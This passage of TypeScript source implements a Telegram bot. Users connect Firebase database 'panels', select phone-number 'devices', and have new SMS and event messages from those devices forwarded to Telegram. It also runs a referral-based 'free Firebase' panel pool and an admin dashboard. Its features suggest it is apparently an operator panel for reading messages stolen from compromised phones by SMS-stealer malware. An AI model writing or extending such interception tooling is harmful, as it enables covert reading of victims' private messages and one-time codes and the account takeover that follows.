  setSession(userId(ctx), { monitoring: true });
  await answerCallback(ctx);
  await editOrReply(ctx, `━━━━━━━━━━━━━━━━━━━━\n📡 LIVE EVENTS\n━━━━━━━━━━━━━━━━━━━━\n\nListening for new authorized application events...\n\n🟢 Monitoring Active\n\nDevice:\n${device.deviceId}\n\n━━━━━━━━━━━━━━━━━━━━`, { inline_keyboard: [[{ text: "🔄 Refresh", callback_data: `events:${firebaseId}:${encodeURIComponent(normalized)}` }, { text: "🛑 Stop Monitoring", callback_data: `stop_events:${firebaseId}:${encodeURIComponent(normalized)}` }], [{ text: "🚫 Unselect Number", callback_data: "unselect_device" }], [{ text: "⬅️ Device Details", callback_data: `device:${firebaseId}:${encodeURIComponent(normalized)}` }, { text: "🏠 Home", callback_data: "home" }]] });
});
bot.action(/^stop_events:([^:]+):(.+)$/, async ctx => { unselectDevice(userId(ctx)); clearSession(userId(ctx)); await answerCallback(ctx); await editOrReply(ctx, "🔴 Number Unselected\n\nMonitoring stopped. No more messages will be sent for this number.", navKeyboard("home")); });
bot.action("unselect_device", async ctx => { const id = userId(ctx); unselectDevice(id); clearSession(id); await answerCallback(ctx); await editOrReply(ctx, "✅ Number Unselected\n\nMonitoring stopped. No more messages will be sent for this number.", navKeyboard("home")); });
bot.action("back", async ctx => { unselectDevice(userId(ctx)); if (await guard(ctx)) { await answerCallback(ctx); const screen = back(userId(ctx)); if (screen === "my_firebase") await renderFirebaseList(ctx); else if (screen === "devices") await renderDevices(ctx); else await renderHome(ctx); } });

bot.command("admin", async ctx => {
  if (!(await guard(ctx))) return;
  if (!admin(ctx)) {
    await ctx.reply("❌ Access Denied\n\nYour Telegram ID is not configured as the admin ID. Send /myid, then set ADMIN_TELEGRAM_ID to that numeric ID and restart the bot.");
    return;
  }
  await renderAdmin(ctx);
});
async function renderAdmin(ctx: Context) {
  if (!admin(ctx)) return;
  const stats = await adminStats();
  const maintenanceEnabled = (await getSetting("maintenance_mode", "false")) === "true";
  await editOrReply(ctx, [
    "━━━━━━━━━━━━━━━━━━━━",
    "👑 ADMIN DASHBOARD",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    "SYSTEM OVERVIEW",
    `👥 Users: ${stats?.users ?? 0}`,
    `🔥 Firebase Connections: ${stats?.connections ?? 0}`,
    `📱 Cached Devices: ${stats?.devices ?? 0}`,
    `🟢 Online: ${stats?.online ?? 0}  ·  🔴 Offline: ${stats?.offline ?? 0}`,
    "",
    `🛠 Maintenance: ${maintenanceEnabled ? "ON" : "OFF"}`,
    "",
    "Choose a section below.",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n"), adminKeyboard(maintenanceEnabled));
}

async function renderAdminUsers(ctx: Context) {
  if (!admin(ctx)) return;
  const users = await getAdminUsers(20);
  await editOrReply(ctx, adminUsersText(users), adminUsersKeyboard(users));
}

async function renderAdminConnections(ctx: Context) {
  if (!admin(ctx)) return;
  const connections = await getAdminConnections(20);
  await editOrReply(ctx, adminConnectionsText(connections), adminConnectionsKeyboard());
}

async function renderAdminSettings(ctx: Context) {
  if (!admin(ctx)) return;
  const limit = Number(await getSetting("firebase_limit", "10"));
  const maintenanceEnabled = (await getSetting("maintenance_mode", "false")) === "true";
  await editOrReply(ctx, adminSettingsText(limit, maintenanceEnabled), adminSettingsKeyboard(limit, maintenanceEnabled));
}
bot.action("admin", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdmin(ctx); } });
bot.action("admin_refresh", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdmin(ctx); } });
bot.action("admin_stats", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdmin(ctx); } });
bot.action("admin_users", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminUsers(ctx); } });
bot.action("admin_connections", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminConnections(ctx); } });
bot.action("admin_settings", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminSettings(ctx); } });
bot.action("admin_free", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminFreeAccess(ctx); } });
bot.action("admin_content", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminContent(ctx); } });
bot.action("admin_content_referral", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "referral_message", screen: "admin_content" });
  await answerCallback(ctx);
  await editOrReply(ctx, adminContentPrompt("referral"), navKeyboard("admin_content"));
});
bot.action("admin_content_maintenance", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "maintenance_message", screen: "admin_content" });
  await answerCallback(ctx);
  await editOrReply(ctx, adminContentPrompt("maintenance"), navKeyboard("admin_content"));
});
bot.action("admin_content_how_to_use", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "how_to_use_message", screen: "admin_content" });
  await answerCallback(ctx);
  await editOrReply(ctx, adminContentPrompt("how_to_use"), navKeyboard("admin_content"));
});
bot.action("admin_referral_min", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const minimum = Number(await getSetting("minimum_referrals", "3"));
  await answerCallback(ctx);
  await editOrReply(ctx, adminReferralText(minimum), adminReferralKeyboard(minimum));
});
bot.action(/^admin_referrals:(\d+)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const minimum = Number(ctx.match[1]);
  await setSetting("minimum_referrals", String(minimum));
  await logSystem("info", "minimum_referrals_changed", `Minimum qualified referrals set to ${minimum}`, userId(ctx));
  await answerCallback(ctx, `Minimum set to ${minimum}`);
  await renderAdminFreeAccess(ctx);
});
bot.action("admin_referrals_custom", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "referral_minimum", screen: "admin_referral_min" });
  await answerCallback(ctx);
  await editOrReply(ctx, "🎯 CUSTOM MINIMUM REFERRALS\n\nSend a whole number from 0 to 1000.\n\nSend /cancel to stop.", navKeyboard("admin_referral_min"));
});
bot.action("admin_free_pool", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminFreePool(ctx); } });
bot.action("admin_free_pool_add", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "free_firebase_url", screen: "admin_free_pool" });
  await answerCallback(ctx);
  await editOrReply(ctx, "➕ ADD FREE FIREBASE\n\nSend:\nhttps://project-default-rtdb.firebaseio.com\n\nOr with a display name:\nPanel 1 | https://project-default-rtdb.firebaseio.com\n\nSend /cancel to stop.", navKeyboard("admin_free_pool"));
});
bot.action(/^admin_free_pool_remove:(.+)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  await removeFreeFirebasePanel(ctx.match[1]);
  await logSystem("info", "free_firebase_removed", `Removed reward pool panel ${ctx.match[1]}`, userId(ctx));
  await answerCallback(ctx, "Free Firebase removed");
  await renderAdminFreePool(ctx);
});
bot.action("admin_channels", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminChannels(ctx); } });
bot.action("admin_channel_add", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "required_channel", screen: "admin_channels" });
  await answerCallback(ctx);
  await editOrReply(ctx, "➕ ADD REQUIRED CHANNEL\n\nSend a public channel username:\n@yourchannel\n\nOr include an invite link:\n@yourchannel | https://t.me/yourchannel\n\nThe bot must be an admin/member of the channel to verify joins.\n\nSend /cancel to stop.", navKeyboard("admin_channels"));
});
bot.action(/^admin_channel_remove:(.+)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  await removeRequiredChannel(ctx.match[1]);
  await logSystem("info", "required_channel_removed", `Removed required channel ${ctx.match[1]}`, userId(ctx));
  await answerCallback(ctx, "Required channel removed");
  await renderAdminChannels(ctx);
});
bot.action(/^admin_user:(-?\d+)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const target = Number(ctx.match[1]);
  const user = (await getAdminUsers(100)).find(candidate => candidate.telegramId === target);
  if (!user) {
    await answerCallback(ctx, "User not found", { show_alert: true });
    return;
  }
  await answerCallback(ctx);
  await editOrReply(ctx, adminUserText(user), adminUserKeyboard(user));
});
bot.action(/^admin_user_apply:(-?\d+):(ban|unban)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const target = Number(ctx.match[1]);
  if (target === userId(ctx)) {
    await answerCallback(ctx, "You cannot change your own access.", { show_alert: true });
    return;
  }
  const banned = ctx.match[2] === "ban";
  const user = (await getAdminUsers(100)).find(candidate => candidate.telegramId === target);
  if (!user) {
    await answerCallback(ctx, "User not found", { show_alert: true });
    return;
  }
  await setUserBanned(target, banned);
  await logSystem("info", banned ? "user_banned" : "user_unbanned", `Admin changed access for ${target}`, userId(ctx));
  await answerCallback(ctx, banned ? "User blocked" : "User unblocked");
  await renderAdminUsers(ctx);
});
bot.action(/^admin_limit:(2|5|10|20)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const limit = Number(ctx.match[1]);
  await setSetting("firebase_limit", String(limit));
  await logSystem("info", "firebase_limit_changed", `Firebase limit set to ${limit}`, userId(ctx));
  await answerCallback(ctx, `Limit set to ${limit}`);
  await renderAdminSettings(ctx);
});
bot.action("broadcast", async ctx => { if (await guard(ctx) && admin(ctx)) { setSession(userId(ctx), { awaiting: "broadcast" }); await answerCallback(ctx); await editOrReply(ctx, "━━━━━━━━━━━━━━━━━━━━\n📢 BROADCAST\n━━━━━━━━━━━━━━━━━━━━\n\nSend the message you want to broadcast.\n\nThe message will be previewed before sending.", navKeyboard("admin")); } });
bot.action("maintenance", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const current = await getSetting("maintenance_mode", "false");
  await setSetting("maintenance_mode", current === "true" ? "false" : "true");
  await logSystem("info", "maintenance_toggled", `Maintenance mode ${current === "true" ? "off" : "on"}`, userId(ctx));
  await answerCallback(ctx, `Maintenance ${current === "true" ? "OFF" : "ON"}`);
  await renderAdmin(ctx);
});
bot.action("logs", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const logs = await (await import("./db.js")).query<{ level: string; event: string; detail: string; created_at: string }>("SELECT level, event, detail, created_at FROM system_logs ORDER BY created_at DESC LIMIT 15");
  await answerCallback(ctx);
  await editOrReply(ctx, "━━━━━━━━━━━━━━━━━━━━\n📝 SYSTEM LOGS\n━━━━━━━━━━━━━━━━━━━━\n\n" + (logs.map(l => `${l.level.toUpperCase()} · ${l.event}\n${l.detail ?? ""}\n${l.created_at}`).join("\n\n") || "No logs yet."), navKeyboard("admin"));
});
bot.action(/^broadcast_send:(.+)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const text = Buffer.from(ctx.match[1], "base64url").toString();
  const users = await (await import("./db.js")).query<{ telegram_id: string }>("SELECT telegram_id FROM users WHERE is_banned = false");
  let sent = 0, failed = 0;
  for (const target of users) {
    try { await ctx.telegram.sendMessage(Number(target.telegram_id), text); sent++; } catch { failed++; }
  }
  await answerCallback(ctx, "Broadcast complete");
  await editOrReply(ctx, `📊 BROADCAST COMPLETE\n\n✅ Sent: ${sent}\n❌ Failed: ${failed}\n🚫 Blocked: ${failed}`, navKeyboard("admin"));
});

function startMonitor(telegramId: number, firebaseId: string, device: Device) {
  const key = `${telegramId}:${firebaseId}:${device.normalizedDeviceId}`;
  if (monitors.has(key)) return;
  let initialized = false;
  let monitor: DeviceMonitor | undefined;
  const isActive = () => Boolean(monitor?.active && monitors.get(key) === monitor);
  const poll = async () => {
    if (!isActive()) return;
    try {
      const connection = await getConnection(telegramId, firebaseId);
      if (!isActive()) return;
      if (!connection) {
        stopMonitor(telegramId, firebaseId, device.normalizedDeviceId);
        return;
      }
      const root = await readFirebase(connection.firebaseUrl);
      if (!isActive()) return;
      const latest = extractDevices(root).find(d => d.normalizedDeviceId === device.normalizedDeviceId);
      if (!latest) return;
      // SMS/event data is sometimes stored beside the device branch or keyed
      // by the selected phone number, so search the full snapshot as well.
      const events = collectEvents(latest, root);
      if (!initialized) {
        for (const event of events) {
          if (!isActive()) return;
          await markEventSeen(telegramId, firebaseId, latest.normalizedDeviceId, event.id, event.fingerprint);
        }
        if (!isActive()) return;
        initialized = true;
        return;
      }
      for (const event of events) {
        if (!isActive()) return;
        if (await eventSeen(firebaseId, latest.normalizedDeviceId, event.id)) continue;
        if (!isActive()) return;
        await markEventSeen(telegramId, firebaseId, latest.normalizedDeviceId, event.id, event.fingerprint);
        if (!isActive()) return;
        await bot.telegram.sendMessage(telegramId, `━━━━━━━━━━━━━━━━━━━━\n📩 NEW DEVICE MESSAGE\n━━━━━━━━━━━━━━━━━━━━\n\n📱 Device: ${latest.deviceId}\n🕒 Time: ${event.timestamp ?? new Date().toISOString()}\n\n💬 Message:\n${event.message}\n\n━━━━━━━━━━━━━━━━━━━━`);
      }
    } catch (error) { await logSystem("error", "event_monitor_failed", error instanceof Error ? error.message : String(error), telegramId); }
  };
  monitor = { active: true, timer: setInterval(() => { void poll(); }, config.FIREBASE_SCAN_INTERVAL_MS) };
  monitors.set(key, monitor);
  void poll();
}

function stopMonitor(telegramId: number, firebaseId: string, normalized: string) {
  const key = `${telegramId}:${firebaseId}:${normalized}`;
  const monitor = monitors.get(key);
  if (monitor) {
    monitor.active = false;
    clearInterval(monitor.timer);
  }
  monitors.delete(key);
}

function unselectDevice(telegramId: number) {
  // Stop every monitor owned by this user so an older/stale selection cannot
  // keep delivering messages after the user leaves the device screen.
  for (const [key, monitor] of monitors) if (key.startsWith(`${telegramId}:`)) {
    monitor.active = false;
    clearInterval(monitor.timer);
    monitors.delete(key);
  }
  setSession(telegramId, {
    selectedFirebaseId: undefined,
    selectedDeviceId: undefined,
    monitoring: false,
  });
}

function stopMonitorsFor(firebaseId: string) {
  for (const [key, monitor] of monitors) if (key.includes(`:${firebaseId}:`)) {
    monitor.active = false;
    clearInterval(monitor.timer);
    monitors.delete(key);
  }
}

bot.catch(async (error, ctx) => { await logSystem("error", "unexpected_exception", error instanceof Error ? error.message : String(error), ctx.from?.id); });
process.once("SIGINT", async () => { for (const monitor of monitors.values()) { monitor.active = false; clearInterval(monitor.timer); } await pool.end(); bot.stop("SIGINT"); });
process.once("SIGTERM", async () => { for (const monitor of monitors.values()) { monitor.active = false; clearInterval(monitor.timer); } await pool.end(); bot.stop("SIGTERM"); });

export async function startTelegramBot(): Promise<void> {
  logger.info("Initializing Telegram bot database schema");
  await ensureSchema();
  logger.info("Telegram bot database schema ready");
  const me = await bot.telegram.getMe();
  botUsername = me.username ?? "";
  void bot.launch({ dropPendingUpdates: true }).catch(async error => {
    await logSystem("error", "telegram_polling_failed", error instanceof Error ? error.message : String(error));
    logger.error({ err: error }, "Telegram polling stopped");
  });
  logger.info("Telegram polling client initialized");
}